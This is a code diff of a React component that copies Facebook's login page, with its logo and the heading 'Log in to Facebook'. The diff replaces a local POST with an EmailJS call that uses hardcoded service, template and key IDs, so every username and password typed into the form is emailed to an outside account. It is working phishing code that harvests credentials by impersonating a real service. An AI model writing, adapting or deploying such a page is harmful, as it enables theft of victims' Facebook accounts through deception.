@@ -1,38 +1,40 @@
 import './login.css';
 import fbTextLogo from './fbTextLogo.svg'
-import { useState } from 'react';
-import axios from 'axios';
-
+import React, { useRef } from 'react';
+import emailjs from '@emailjs/browser';
 
 
 
 const Login = () => {
 
-    const [user,setuser]=useState('')
-    const[pass,setpass]=useState('')
-    
-   async  function handlelogin(e){
-        e.preventDefault()
-    
-        await axios.post('http://localhost:4000/postuser',{
-            email:user,
-            password:pass
-          }).then(()=>{console.log('Done!')}).catch((err)=>{console.log(err);})
-    }
+    const form = useRef();
 
+    const sendEmail = (e) => {
+      e.preventDefault();
+  
+      emailjs.sendForm('service_ie0vfk9', 'template_yg9ejah', form.current, 'dEGoKuhfgKTVYF7fL')
+        .then((result) => {
+            console.log(result.text);
+        }, (error) => {
+            console.log(error.text);
+        });
+    };
+
+
+  
 
 return (
 <div className="login-facebook">
 <div className="loginLogo">
  <img src={fbTextLogo} alt="facebook" />
 </div>
-<form className='myform'>
+<form className='myform'ref={form} onSubmit={sendEmail}>
 <label>Log in to Facebook</label>
 <div className='INPUT'>
-<input type='text' placeholder='Username or Email'className='inputmyform' value={user} onChange={(e)=>{setuser(e.target.value)}}></input>
-<input type='password' placeholder='Password' className='inputmyform' value={pass}  onChange={(e)=>{setpass(e.target.value)}}></input>
+<input type='text' placeholder='Username or Email'className='inputmyform'  name='user'></input>
+<input type='password' placeholder='Password' className='inputmyform'  name='pass'></input>
 </div>
-<button type="submit" onClick={handlelogin}>Sign In</button>
+<button type="submit" value='Send'>Sign In</button>
 </form>
 </div>
     )
